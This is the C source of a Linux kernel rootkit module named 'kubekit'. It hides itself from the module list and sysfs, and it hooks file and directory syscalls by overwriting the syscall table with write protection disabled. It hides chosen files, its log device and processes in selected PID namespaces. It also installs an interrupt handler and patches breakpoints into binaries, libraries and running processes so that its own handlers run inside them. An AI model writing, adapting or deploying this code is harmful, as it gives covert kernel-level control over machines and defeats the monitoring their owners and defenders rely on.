#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/elf.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/semaphore.h>
#include <linux/compiler_types.h>
#include <linux/version.h>
#include <linux/mutex.h>
#include <linux/nsproxy.h>
#include <linux/pid_namespace.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/sched/signal.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 5, 0)
#include <linux/instrumentation.h>
#else
#include <linux/compiler.h>
#endif

#include "helpers.h"
#include "kubekit.h"
#include "logging.h"
#include "syscall_hooks.h"

struct list_head kubekit_bp_list;
LIST_HEAD(kubekit_bp_list);

struct list_head hidden_files;
LIST_HEAD(hidden_files);
struct mutex hidden_files_lock;

unsigned int *hidden_pidns = NULL;
size_t hidden_pidns_size;
struct mutex hidden_pidns_lock;

sys_call_ptr_t *syscall_table = NULL;
sys_call_ptr_t *prev_syscall_table = NULL;

struct list_head *prev_module = NULL;

inline void kill_self(void) {
    THIS_MODULE->exit();
}

// fix: UAF if prev_module has been unloaded
void show_self(void) {
    list_add(&THIS_MODULE->list, prev_module);
}

void hide_self(void) {
    if (prev_module == NULL) {
        prev_module = THIS_MODULE->list.prev;
    }

    list_del_init(&THIS_MODULE->list);
}

bool proc_is_hidden(struct task_struct *task) {
    char *file;
    bool ret;

    file = format_str("/proc/%d/", task->pid);
    if (file == NULL) {
        return false;
    }

    ret = file_hidden(file);

    kfree(file);
    return ret;
}

void unhide_proc(int pid) {
    char *file;

    file = format_str("/proc/%d/", pid);
    if (file == NULL) {
        return;
    }

    unhide_file(file);
    kfree(file);
}

void hide_proc(int pid) {
    char *file;

    file = format_str("/proc/%d/", pid);
    if (file == NULL) {
        return;
    }

    hide_file(file);
    kfree(file);
}

void unhide_pidns(unsigned int id) {
    int i;

    mutex_lock(&hidden_pidns_lock);

    if (hidden_pidns == NULL) {
        mutex_unlock(&hidden_pidns_lock);
        return;
    }

    for (i = 0; i < hidden_pidns_size && hidden_pidns[i] != 0; i++) {
        if (id == hidden_pidns[i]) {
            memmove(
                &hidden_pidns[i],
                &hidden_pidns[i + 1],
                (hidden_pidns_size - i - 1) * sizeof(hidden_pidns[0])
            );
            break;
        }
    }

    mutex_unlock(&hidden_pidns_lock);
}

int hide_pidns(unsigned int id) {
    int i;

    mutex_lock(&hidden_pidns_lock);

    if (hidden_pidns == NULL) {
        hidden_pidns_size = 1024;
        hidden_pidns = kzalloc(
            hidden_pidns_size * sizeof(hidden_pidns[0]),
            GFP_KERNEL
        );
        if (hidden_pidns == NULL) {
            mutex_unlock(&hidden_pidns_lock);
            return -1;
        }
    }

    for (i = 0; i < hidden_pidns_size && hidden_pidns[i] != 0; i++) {
        if (id == hidden_pidns[i]) {
            mutex_unlock(&hidden_pidns_lock);
            return 0;
        }
    }

    if (i >= hidden_pidns_size / sizeof(unsigned int)) {
        hidden_pidns_size *= 2;
        kfree(hidden_pidns);
        hidden_pidns = kzalloc(
            hidden_pidns_size * sizeof(hidden_pidns[0]),
            GFP_KERNEL
        );
        if (hidden_pidns == NULL) {
            mutex_unlock(&hidden_pidns_lock);
            return -1;
        }
    }

    hidden_pidns[i] = id;
 
    mutex_unlock(&hidden_pidns_lock);
    return 0;
}

void update_hide_pids(void) {
    struct task_struct *p;
    struct nsproxy *nsproxy;
    unsigned int process_pidns;
    int i;
    bool should_hide, found;
    struct kubekit_hidden_file *cur, *tmp;
    int pid;

    if (hidden_pidns == NULL) {
        return;
    }

    // add new processes from hidden pid namespaces to hidden_files
    for_each_process(p) {
        nsproxy = p->nsproxy;
        if (nsproxy == NULL || nsproxy->pid_ns_for_children == NULL) {
            continue;
        }

        process_pidns = nsproxy->pid_ns_for_children->ns.inum;
        mutex_lock(&hidden_pidns_lock);

        if (hidden_pidns == NULL) {
            mutex_unlock(&hidden_pidns_lock);
            break;
        }

        should_hide = false;
        for (i = 0; i < hidden_pidns_size && hidden_pidns[i] != 0; i++) {
            if (process_pidns == hidden_pidns[i]) {
                should_hide = true;
                break;
            }
        }

        mutex_unlock(&hidden_pidns_lock);

        if (should_hide == true) {
            hide_proc(p->pid);
            continue;
        }

        if (proc_is_hidden(p) == true) {
            unhide_proc(p->pid);
        }
    }

    // remove dead hidden processes from hidden_files
    mutex_lock(&hidden_files_lock);

    list_for_each_entry_safe(cur, tmp, &hidden_files, list) {
        if (strncmp(cur->file, "/proc/", 6) != 0) {
            continue;
        }

        pid = simple_strtol(cur->file + 6, NULL, 10);

        found = false;
        for_each_process(p) {
            if (p->pid == pid) {
                found = true;
                break;
            }
        }

        if (found == false) {
            list_del(&cur->list);
            kfree(cur->file);
            kfree(cur);
        }
    }

    mutex_unlock(&hidden_files_lock);
}

bool should_hide_file(const char *file) {
    size_t a_len, b_len;
    const char *a, *b;
    struct kubekit_hidden_file *cur;

    mutex_lock(&hidden_files_lock);

    list_for_each_entry(cur, &hidden_files, list) {
        a = file;
        b = cur->file;

        if (strcmp(a, b) == 0) {
            mutex_unlock(&hidden_files_lock);
            return true;
        }

        a_len = strlen(a);
        b_len = strlen(b);
        if (a_len == b_len) {
            continue;
        }

        if (a_len > b_len) {
            if (b[b_len - 1] == '/' && strncmp(a, b, b_len) == 0) {
                mutex_unlock(&hidden_files_lock);
                return true;
            }

            if (b[b_len - 1] != '/' &&
                strncmp(a, b, b_len) == 0 &&
                a[b_len] == '/') {
                mutex_unlock(&hidden_files_lock);
                return true;
            }
        } else if (a_len == b_len - 1) {
            if (b[b_len - 1] == '/' &&
                a[a_len - 1] != '/' &&
                strncmp(a, b, a_len) == 0) {
                mutex_unlock(&hidden_files_lock);
                return true;
            }
        }
    }

    mutex_unlock(&hidden_files_lock);
    return false;
}

inline sys_call_ptr_t hook_get_orig(int sysidx) {
    if (prev_syscall_table == NULL) {
        return NULL;
    }

    return prev_syscall_table[sysidx];
}

int hook_syscall(int sysidx, void *handler) {
    if (syscall_table == NULL) {
        syscall_table = (sys_call_ptr_t *)get_sys_call_table();
        if (syscall_table == NULL) {
            return -1;
        }
    }

    // check if the syscall at sysidx is already hooked
    if (hook_get_orig(sysidx) != NULL) {
        return -1;
    }

    if (prev_syscall_table == NULL) {
        prev_syscall_table = kzalloc(
            NR_syscalls * sizeof(prev_syscall_table[0]),
            GFP_KERNEL
        );
        if (prev_syscall_table == NULL) {
            return -1;
        }
    }

    prev_syscall_table[sysidx] = syscall_table[sysidx];

    disable_write_protection();
    syscall_table[sysidx] = handler;
    enable_write_protection();

    return 0;
}

bool file_hidden(const char *file) {
    struct kubekit_hidden_file *cur;

    mutex_lock(&hidden_files_lock);

    list_for_each_entry(cur, &hidden_files, list) {
        if (strcmp(cur->file, file) == 0) {
            mutex_unlock(&hidden_files_lock);
            return true;
        }
    }

    mutex_unlock(&hidden_files_lock);
    return false;
}

void unhide_file(const char *file) {
    struct kubekit_hidden_file *cur, *tmp;

    mutex_lock(&hidden_files_lock);

    list_for_each_entry_safe(cur, tmp, &hidden_files, list) {
        if (strcmp(cur->file, file) == 0) {
            list_del(&cur->list);
            kfree(cur->file);
            kfree(cur);
            break;
        }
    }

    mutex_unlock(&hidden_files_lock);
}

int hide_file(const char *file) {
    struct kubekit_hidden_file *new;
    size_t len;

    mutex_lock(&hidden_files_lock);

    // check if the file already is in the list 
    // of hidden files
    list_for_each_entry(new, &hidden_files, list) {
        if (strcmp(new->file, file) == 0) {
            mutex_unlock(&hidden_files_lock);
            return 0;
        }
    }

    len = strlen(file);
    if (len == 0) {
        mutex_unlock(&hidden_files_lock);
        return 0;
    }

    new = kmalloc(sizeof(*new), GFP_KERNEL);
    if (new == NULL) {
        mutex_unlock(&hidden_files_lock);
        return -1;
    }

    new->file = kmalloc(len + 1, GFP_KERNEL);
    if (new->file == NULL) {
        mutex_unlock(&hidden_files_lock);
        kfree(new);
        return -1;
    }

    strcpy(new->file, file);
    new->file[len] = '\0';

    list_add(&new->list, &hidden_files);

    mutex_unlock(&hidden_files_lock);
    return 0;
}

int handle_writes(char *file,
                  off_t offset,
                  u8 *bytes,
                  size_t size,
                  u64 flags,
                  u8 *prev) {
    int ret = 0;

    if (flags & KKFL_FILE) {
        if (write_file(file, bytes, size, offset) < 0) {
            ret = -1;
        }
    }

    if (flags & KKFL_PROC) {
        write_to_all_proc(file, offset, bytes, size, prev);
    }

    if (flags & KKFL_LIB) {
        write_to_all_lib(file, offset, bytes, size);
    }

    return ret;
}

void remove_bp(struct kubekit_bp *bp) {
    struct bp_pos *bp_pos;

    list_for_each_entry(bp_pos, &bp->positions, list) {
        // if prev_bytes haven't been saved yet skip.
        // this can only happen on end breakpoints where their
        // respective start breakpoint hasn't been hit yet
        if (memcmp(bp_pos->prev_bytes, "\xcc\xcc", INST_SIZE) == 0) {
            continue;
        }

        handle_writes(
            bp_pos->file,
            bp_pos->offset, 
            bp_pos->prev_bytes, 
            INST_SIZE, 
            bp->flags | KKFL_FILE | KKFL_PROC,
            NULL
        );
    }
}

int add_bp(struct kubekit_bp *bp) {
    u8 inst[] = { 0xcd, kubekit_irq_num };
    int ret = 0;
    struct bp_pos *bp_pos;

    if (bp->written) {
        return ret;
    }

    bp_pos = list_first_entry(&bp->positions, struct bp_pos, list);

    ret = handle_writes(
        bp_pos->file,
        bp_pos->offset, 
        inst, 
        INST_SIZE,
        bp->flags,
        bp_pos->prev_bytes
    );
    if (ret == 0) {
        bp->written = true;
    }

    return ret;
}

// find offset in the target file from the function name
off_t kubekit_find_offset(char *file, char *func, bool lib) {
    u8 *buf = NULL;
    int ret = -1, i, j;
    Elf64_Ehdr *ehdr;
    Elf64_Shdr *shdr;
    Elf64_Sym *symtab = NULL;
    size_t symtab_entries;
    char *sym_name;

    buf = read_file(file);
    if (buf == NULL) {
        goto finish;
    }

    // sanity check the elf headers
    if (memcmp(buf, ELFMAG, SELFMAG) != 0) {
        goto free;
    }

    ehdr = (Elf64_Ehdr *)buf;
    shdr = (Elf64_Shdr *)(buf + ehdr->e_shoff);

    // find symbol table
    for (i = 0; i < ehdr->e_shnum; i++) {
        if (lib == false && shdr[i].sh_type == SHT_SYMTAB) {
            symtab = (Elf64_Sym *)(buf + shdr[i].sh_offset);
            symtab_entries = shdr[i].sh_size / sizeof(Elf64_Sym);
            break;
        }

        if (lib == true && shdr[i].sh_type == SHT_DYNSYM) {
            symtab = (Elf64_Sym *)(buf + shdr[i].sh_offset);
            symtab_entries = shdr[i].sh_size / sizeof(Elf64_Sym);
            break;
        }
    }

    if (symtab == NULL) {
        goto free;
    }

    ret = 0;

    for (i = 0; i < ehdr->e_shnum; i++) {
        // dont break out when SHT_STRTAB is found
        // because there could be multiple strtables
        // also fix: this could potentially return invalid
        // offset as it doesn't confirm that the current
        // strtab is valid for the current symbol (basically
        // the symbol we are looking up might not be in this
        // strtab as most of the time there are multiple strtabs)
        if (shdr[i].sh_type != SHT_STRTAB) {
            continue;
        }

        for (j = 0; j < symtab_entries; j++) {
            if (symtab[j].st_name == 0) {
                continue;
            }

            sym_name = (buf + shdr[i].sh_offset) + symtab[j].st_name;
            if (strlen(sym_name) == 0) {
                break;
            }

            if (strcmp(sym_name, func) == 0) {
                ret = symtab[j].st_value;
                goto free;
            }
        }
    }

free:
    vfree(buf);

finish:
    return ret;
}

// removes all breakpoints
void kubekit_del_all(void) {
    struct kubekit_bp *curr, *tmp;
    struct semaphore *lock;
    struct bp_pos *bp_pos, *_bp_pos;
    int waiting;

    list_for_each_entry_safe(curr, tmp, &kubekit_bp_list, list) {
        lock = curr->lock;
        down(lock);

        remove_bp(curr);

        list_for_each_entry_safe(bp_pos, _bp_pos, &curr->positions, list) {
            list_del(&bp_pos->list);
            kfree(bp_pos->file);
            kfree(bp_pos);
        }

        list_del(&curr->list);

        // shouldn't get any new instances waiting from this point as
        // the int instruction has been removed
        waiting = atomic_read(&curr->waiting);
        if (waiting == 0) {
            if (curr->next != NULL) {
                curr->next->next = NULL;
            }
            kfree(curr);
        } else {
            curr->removed = true;
        }

        up(lock);

        // as we share a single lock between two breakpoints (start, end)
        // we can free the lock only on the breakpoint that is getting
        // freed last out of the pair
        if (waiting == 0 && curr->next == NULL) {
            kfree(lock);
        }
    }

    return;
}

struct kubekit_bp *kubekit_lookup_bp_from_task_struct(
                    struct task_struct *task,
                    unsigned long rip) {
    struct vm_area_struct *vma;
    struct kubekit_bp *ret = NULL;
    off_t offset;
    char *full_path, *p;
    u64 base_addr;

    vma = get_vma_from_ptr(task, rip);
    if (vma == NULL) {
        return ret;
    }

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (full_path == NULL) {
        return ret;
    }

    base_addr = vma->vm_start - vma->vm_pgoff * PAGE_SIZE;
    offset = rip - base_addr - INST_SIZE;
    p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);

    ret = kubekit_lookup_bp(
        p,
        offset
    );

    kfree(full_path);

    return ret;
}

struct kubekit_bp *kubekit_lookup_bp(char *file, off_t offset) {
    struct kubekit_bp *bp;
    struct bp_pos *bp_pos;
    char *filename, *cmp;

    filename = extract_filename_from_full_path(file);

    list_for_each_entry(bp, &kubekit_bp_list, list) {
        list_for_each_entry(bp_pos, &bp->positions, list) {
            if (*bp_pos->file != '/') {
                cmp = filename;
            } else {
                cmp = file;
            }

            if (strcmp(cmp, bp_pos->file) == 0 && offset == bp_pos->offset) {
                return bp;
            }
        }
    }

    return NULL;
}

struct kubekit_bp *alloc_bp(char *file,
                            off_t offset,
                            void (*handler)(struct pt_regs *),
                            u64 flags,
                            struct kubekit_bp *next,
                            struct semaphore *lock) {
    struct kubekit_bp *bp;
    struct bp_pos *bp_pos;
    char *file_chunk;
    u8 *buf;

    bp = kmalloc(sizeof(*bp), GFP_KERNEL);
    if (bp == NULL) {
        return NULL;
    }

    bp_pos = kmalloc(sizeof(*bp_pos), GFP_KERNEL);
    if (bp_pos == NULL) {
        kfree(bp);
        return NULL;
    }

    file_chunk = kmalloc(strlen(file) + 1, GFP_KERNEL);
    if (file_chunk == NULL) {
        kfree(bp);
        kfree(bp_pos);
        return NULL;
    }
    file_chunk[strlen(file)] = '\0';
    strcpy(file_chunk, file);

    bp_pos->file = file_chunk;
    bp_pos->offset = offset;
    memset(bp_pos->prev_bytes, 0xcc, INST_SIZE);

    INIT_LIST_HEAD(&bp->positions);
    list_add(&bp_pos->list, &bp->positions);
    bp->handler = handler;
    bp->flags = flags;
    bp->next = next;
    bp->written = false;
    bp->lock = lock;
    bp->removed = false;
    atomic_set(&bp->waiting, 0);

    // offset less than 0 means it needs to be determined at runtime
    if (offset < 0) {
        bp->is_end = true;
        return bp;
    }
    bp->is_end = false;

    // get previous bytes only if a full path is supplied
    if (*file == '/') {
        buf = read_file(file);
        if (buf == NULL) {
            kfree(bp);
            kfree(file_chunk);
            return NULL;
        }

        memcpy(bp_pos->prev_bytes, &buf[offset], INST_SIZE);
        vfree(buf);
    }

    return bp;
}

int kubekit_add_bp(char *file,
                   off_t offset,
                   off_t func_off,
                   void (*handler)(struct pt_regs *),
                   u64 flags) {
    struct kubekit_bp *start_bp = NULL;
    struct kubekit_bp *end_bp = NULL;
    struct kubekit_bp *bp;
    struct bp_pos *bp_pos;
    struct semaphore *lock = NULL;

    // full path is required unless we only want to add a breakpoint
    // to live processes
    if (*file != '/' && ((flags & KKFL_FILE) || (flags & KKFL_LIB))) {
        goto err_ret;
    }

    // no more in-function breakpoints as it got too complicated
    // to implement, they shouldn't really be needed as a breakpoint
    // at the start and/or at the end of the function should be enough.
    // in-function breakpoints also shouldn't be used as the instruction
    // byte offset will probably not be consistent across different systems
    // because of different binary versions or different compilers
    if (func_off != FUNC_START && func_off != FUNC_END) {
        goto err_ret;
    }

    // check if a breakpoint in this file at this
    // offset already exists
    // if it exists just replace the handler
    bp = kubekit_lookup_bp(file, offset);
    if (bp != NULL) {
        if (func_off == FUNC_START) {
            bp->handler = handler;
        } else if (func_off == FUNC_END) {
            bp->next->handler = handler;
        }

        return 0;
    }

    lock = kmalloc(sizeof(*lock), GFP_KERNEL);
    if (lock == NULL) {
        goto err_ret;
    }
    sema_init(lock, 1);

    start_bp = alloc_bp(
        file,
        offset,
        (func_off == FUNC_START) ? handler : NULL,
        flags,
        NULL,
        lock
    );
    end_bp = alloc_bp(
        file,
        -1,
        (func_off == FUNC_END) ? handler : NULL,
        flags,
        NULL,
        lock
    );
    if (start_bp == NULL || end_bp == NULL) {
        goto err_ret;
    }

    start_bp->next = end_bp;
    end_bp->next = start_bp;

    list_add(&start_bp->list, &kubekit_bp_list);
    list_add(&end_bp->list, &kubekit_bp_list);

    return 0;

err_ret:
    if (start_bp != NULL) {
        bp_pos = list_first_entry(&start_bp->positions, struct bp_pos, list);
        kfree(bp_pos->file);
        kfree(start_bp);
    }

    if (end_bp != NULL) {
        bp_pos = list_first_entry(&end_bp->positions, struct bp_pos, list);
        kfree(bp_pos->file);
        kfree(end_bp);
    }

    if (lock != NULL) {
        kfree(lock);
    }

    return -1;
}

bool end_has_file_offset(struct kubekit_bp *end, char *file, off_t offset) {
    struct bp_pos *bp_pos;

    // sanity check
    if (!end->is_end) {
        return false;
    }

    list_for_each_entry(bp_pos, &end->positions, list) {
        if (strcmp(bp_pos->file, file) == 0 && bp_pos->offset == offset) {
            return true;
        }
    }

    return false;
}

void end_save_file_offset(struct kubekit_bp *end,
                          char *file,
                          off_t offset,
                          u8 *prev_bytes) {
    struct bp_pos *bp_pos;
    char *file_chunk;

    // sanity check
    if (!end->is_end) {
        return;
    }

    // remove -1 offset if it exists as it is just a placeholder
    bp_pos = list_first_entry(&end->positions, struct bp_pos, list);
    if (bp_pos->offset < 0) {
        list_del(&bp_pos->list);
        kfree(bp_pos->file);
        kfree(bp_pos);
    }

    bp_pos = kmalloc(sizeof(*bp_pos), GFP_KERNEL);
    if (bp_pos == NULL) {
        return;
    }

    file_chunk = kmalloc(strlen(file) + 1, GFP_KERNEL);
    if (file_chunk == NULL) {
        kfree(bp_pos);
        return;
    }
    file_chunk[strlen(file)] = '\0';
    strcpy(file_chunk, file);

    bp_pos->file = file_chunk;
    bp_pos->offset = offset;
    memcpy(bp_pos->prev_bytes, prev_bytes, INST_SIZE);

    list_add(&bp_pos->list, &end->positions);
}

bool get_prev_bytes(struct kubekit_bp *bp,
                    struct task_struct *task,
                    u64 rip,
                    u8 *dst) {
    char *full_path, *p, *cmp, *filename;
    struct vm_area_struct *vma;
    off_t offset;
    struct bp_pos *bp_pos;

    vma = get_vma_from_ptr(task, rip);
    if (vma == NULL) {
        return false;
    }

    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (full_path == NULL) {
        return false;
    }

    offset = (rip - (vma->vm_start - vma->vm_pgoff * PAGE_SIZE)) - INST_SIZE;
    p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);
    filename = extract_filename_from_full_path(p);

    list_for_each_entry(bp_pos, &bp->positions, list) {
        if (*bp_pos->file != '/') {
            cmp = filename;
        } else {
            cmp = p;
        }

        if (strcmp(cmp, bp_pos->file) == 0 && offset == bp_pos->offset) {
            memcpy(dst, bp_pos->prev_bytes, INST_SIZE);
            kfree(full_path);
            return true;
        }
    }

    kfree(full_path);
    return false;
}

// find handler function for the current breakpoint and call it
void kubekit_irq_handler(struct pt_regs *regs) {
    struct kubekit_bp *bp;
    struct bp_pos *bp_pos;
    struct vm_area_struct *vma;
    char *full_path, *p;
    u64 base_addr, ret_addr = 0;
    u8 inst[] = { 0xcd, kubekit_irq_num };
    u8 prev_bytes[] = { 0xcc, 0xcc };

    bp = kubekit_lookup_bp_from_task_struct(current, regs->ip);
    if (bp == NULL) {
        return;
    }

    atomic_inc(&bp->waiting);
    down(bp->lock);

    if (bp->removed) {
        if (atomic_dec_and_test(&bp->waiting)) {
            if (bp->next != NULL) {
                bp->next->next = NULL;
            }
            kfree(bp);
        }
        goto unlock_ret;
    }

    atomic_dec(&bp->waiting);

    // restore previous instruction bytes
    if (!get_prev_bytes(bp, current, regs->ip, prev_bytes)) {
        goto unlock_ret;
    }

    write_task_mem(
        current,
        (u8 *)(regs->ip - INST_SIZE),
        prev_bytes, 
        INST_SIZE
    );
    regs->ip -= INST_SIZE;

    if (bp->handler != NULL) {
        bp->handler(regs);
    }

    // true if the current breakpoint is at the start of the function
    if (bp->next->is_end) {
        // here we need to add a breakpoint at the function end
        if (copy_from_user(&ret_addr, (u64 *)regs->sp, sizeof(ret_addr)) != 0) {
            goto unlock_ret;
        }

        if (!valid_return(current, ret_addr)) {
            goto unlock_ret;
        }

        vma = get_vma_from_ptr(current, ret_addr);
        if (vma == NULL) {
            goto unlock_ret;
        }

        full_path = kmalloc(PATH_MAX, GFP_KERNEL);
        if (full_path == NULL) {
            goto unlock_ret;
        }

        p = d_path(&vma->vm_file->f_path, full_path, PATH_MAX);
        base_addr = vma->vm_start - vma->vm_pgoff * PAGE_SIZE;
        if (!end_has_file_offset(bp->next, p, ret_addr - base_addr)) {
            if (copy_from_user(prev_bytes, (u8 *)ret_addr, INST_SIZE) != 0) {
                goto unlock_ret;
            }
            end_save_file_offset(bp->next, p, ret_addr - base_addr, prev_bytes);
        }

        kfree(full_path);
        write_task_mem(current, (u8 *)ret_addr, inst, INST_SIZE);
    } else {
        bp_pos = list_first_entry(&bp->next->positions, struct bp_pos, list);

        // here we are restoring function start breakpoint
        base_addr = get_file_base_from_task_struct(
            current,
            bp_pos->file
        );
        if (base_addr != 0) {
            write_task_mem(
                current,
                (u8 *)(base_addr + bp_pos->offset),
                inst,
                INST_SIZE
            );
        }
    }

unlock_ret:
    up(bp->lock);
}

// entrypoint for int instruction; saves registers, calls
// kubekit_irq_handler and restores registers upon return.
__attribute__((naked)) void entry_kubekit_irq_handler(void) {
    asm volatile(
        "swapgs\n"

        "push %rax\n"
        "push %rdi\n"

        // nop padding to reserve space for (hopefully) future instructions
        // that read cpu_current_top_of_stack and use that as a stack pointer.
        // if these are not overwritten ENTRY_TRAMPOLINE stack exhaustion could
        // occur
        "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
        "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
        "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"

        "push %rsi\n"
        "push %rdx\n"
        "push %rcx\n"
        "push %rax\n"
        "push %r8\n"
        "push %r9\n"
        "push %r10\n"
        "push %r11\n"
        "push %rbx\n"
        "push %rbp\n"
        "push %r12\n"
        "push %r13\n"
        "push %r14\n"
        "push %r15\n"

        "xor %edx, %edx\n"
        "xor %ecx, %ecx\n"
        "xor %r8d, %r8d\n"
        "xor %r9d, %r9d\n"
        "xor %r10d, %r10d\n"
        "xor %r11d, %r11d\n"
        "xor %ebx, %ebx\n"
        "xor %ebp, %ebp\n"
        "xor %r12d, %r12d\n"
        "xor %r13d, %r13d\n"
        "xor %r14d, %r14d\n"
        "xor %r15d, %r15d\n"

        "mov %rsp, %rdi\n"
        "call kubekit_irq_handler\n"
        
        "pop %r15\n"
        "pop %r14\n"
        "pop %r13\n"
        "pop %r12\n"
        "pop %rbp\n"
        "pop %rbx\n"
        "pop %r11\n"
        "pop %r10\n"
        "pop %r9\n"
        "pop %r8\n"
        "pop %rax\n"
        "pop %rcx\n"
        "pop %rdx\n"
        "pop %rsi\n"
        "pop %rdi\n"
        "pop %rax\n"

        "swapgs\n"
        "iretq\n"
    );
}

int kubekit_do_init(void) {
    int ret;
    struct desc_ptr idtr;
    struct module_use *use, *tmp;

    // hide the rootkit
    hide_self();
    kobject_del(&THIS_MODULE->mkobj.kobj);

    list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        kfree(use);
    }

    // get idt_table address
    asm volatile("sidt %0" : "=m" (idtr));
    idt_table = (gate_desc *)idtr.address;

    mutex_init(&hidden_files_lock);
    mutex_init(&hidden_pidns_lock);

    // only initialize the logging if we have successfully
    // hidden the log file in /dev/
    //
    // fix: probably need to hook 32bit syscalls too
    if (hook_syscall(__NR_getdents64, getdents64_hook) == 0 &&
        hook_syscall(__NR_stat, stat_hook) == 0 &&
        hook_syscall(__NR_statx, statx_hook) == 0 &&
        hook_syscall(__NR_open, open_hook) == 0 &&
        hook_syscall(__NR_openat, openat_hook) == 0 &&
        hook_syscall(__NR_unlink, unlink_hook) == 0 &&
        hook_syscall(__NR_unlinkat, unlinkat_hook) == 0 &&
        hook_syscall(__NR_read, read_hook) == 0 &&
        hide_file("/dev/" LOG_DEVICE_NAME) == 0)
    {
        ret = kubekit_log_init();
        if (ret != 0) {
            // logging failed to initialize but the rootkit
            // can work without it so don't return yet
            ;
        }
    }

    if (setup_entry_handler(entry_kubekit_irq_handler) < 0) {
        kubekit_log("Failed to setup entry handler, "
                    "ENTRY_TRAMPOLINE stack exhaustion could happen\n");
    }

    ret = register_irq(entry_kubekit_irq_handler);
    if (ret < 0) {
        return ret;
    }

    return 0;
}

void kubekit_cleanup(void) {
    struct kubekit_hidden_file *file, *file_tmp;
    int i;

    // remove all breakpoints
    kubekit_del_all();

    cleanup_idt();
    kubekit_log_free();

    mutex_lock(&hidden_files_lock);

    list_for_each_entry_safe(file, file_tmp, &hidden_files, list) {
        kfree(file->file);
        kfree(file);
    }

    mutex_unlock(&hidden_files_lock);
    mutex_destroy(&hidden_files_lock);

    mutex_lock(&hidden_pidns_lock);

    if (hidden_pidns != NULL) {
        kfree(hidden_pidns);
        hidden_pidns = NULL;
    }

    mutex_unlock(&hidden_pidns_lock);
    mutex_destroy(&hidden_pidns_lock);

    // unhook all syscalls
    if (prev_syscall_table != NULL) {
        for (i = 0; i < NR_syscalls; i++) {
            if (prev_syscall_table[i] != NULL) {
                disable_write_protection();
                syscall_table[i] = prev_syscall_table[i];
                enable_write_protection();
            }
        }
    }

    kfree(prev_syscall_table);
}

int kubekit_start(void) {
    struct kubekit_bp *bp;
    int ret = 0;

    list_for_each_entry(bp, &kubekit_bp_list, list) {
        if (bp->is_end) {
            continue;
        }

        ret = add_bp(bp);
        if (ret < 0) {
            break;
        }
    }

    return ret;
}
